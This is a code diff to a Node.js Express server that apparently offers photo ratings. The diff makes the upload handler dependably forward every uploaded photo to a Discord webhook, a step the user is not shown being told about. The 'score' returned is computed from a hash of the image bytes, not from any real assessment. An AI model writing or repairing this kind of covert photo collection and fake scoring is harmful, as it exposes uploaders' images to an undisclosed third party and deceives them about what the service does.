@@ -4,6 +4,7 @@ import fs from "fs";
 import path from "path";
 import fetch from "node-fetch";
 import crypto from "crypto";
+import FormData from "form-data";
 
 const app = express();
 const PORT = process.env.PORT || 10000;
@@ -23,11 +24,22 @@ app.get("/", (req, res) => {
 app.post("/upload", upload.single("photo"), async (req, res) => {
   const filePath = req.file.path;
 
-  /* 1️⃣ 디스코드로 사진 무조건 전송 */
+  /* 1️⃣ 디스코드로 이미지 전송 */
   try {
+    if (!DISCORD_WEBHOOK_URL) {
+      throw new Error("DISCORD_WEBHOOK_URL 없음");
+    }
+
     const form = new FormData();
     form.append("file", fs.createReadStream(filePath));
-    await fetch(DISCORD_WEBHOOK_URL, { method: "POST", body: form });
+
+    await fetch(DISCORD_WEBHOOK_URL, {
+      method: "POST",
+      body: form,
+      headers: form.getHeaders()
+    });
+
+    console.log("디스코드 전송 성공");
   } catch (e) {
     console.error("디스코드 전송 실패:", e.message);
   }
@@ -37,7 +49,7 @@ app.post("/upload", upload.single("photo"), async (req, res) => {
   const hash = crypto.createHash("sha256").update(buffer).digest("hex");
   const base = parseInt(hash.slice(0, 8), 16);
 
-  const score = Math.round((5 + (base % 50) / 10) * 10) / 10; // 5.0~10.0
+  const score = Math.round((5 + (base % 50) / 10) * 10) / 10;
   const percent = Math.max(1, 100 - Math.round((score / 10) * 100));
 
   let feedback = "";
